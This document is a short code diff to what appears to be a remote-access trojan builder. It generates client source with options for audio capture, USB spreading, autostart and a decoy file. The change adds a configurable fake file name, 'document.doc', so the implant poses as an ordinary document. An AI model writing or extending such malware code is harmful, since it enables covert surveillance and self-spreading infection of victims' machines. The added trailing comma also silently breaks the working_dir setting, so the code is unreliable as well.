@@ -16,7 +16,8 @@ class SourceGenerator:
     timeout =       '10'
     passkey =       '1705a7f91b40320a19db18912b72148e'
     filename =      'auto_update'
-    working_dir =   'iDocuments'
+    working_dir =   'iDocuments',
+    fake_name =     'document.doc'
 
     def __init__(self):
         pass
@@ -45,6 +46,7 @@ class SourceGenerator:
             '{%audio_streaming_class%}': client_snippets.audio_streaming_class if self.audio else '',
             '{%usb_spreading_class%}': client_snippets.usb_spreading_class if self.usb_spreading else '',
             '{%openFakeFile%}': client_snippets.open_fake_file if self.fake_file else '',
+            '{%fake_file_name%}': self.fake_name,
             '{%usbSpreading%}': client_snippets.usb_spreading_on if self.usb_spreading else '',
             '{%elseStatement%}': client_snippets.run_client_if_startup_on if self.autostart else client_snippets.run_client_if_statup_off,
         }
@@ -81,6 +83,9 @@ class SourceGenerator:
 
     def set_working_dir_name(self, working_dir_name):
         self.working_dir = working_dir_name
+
+    def set_fake_file_name(self, fake_name):
+        self.fake_name = fake_name
 
     def format_source(self, source):
         snippets = self.generate_snippets()
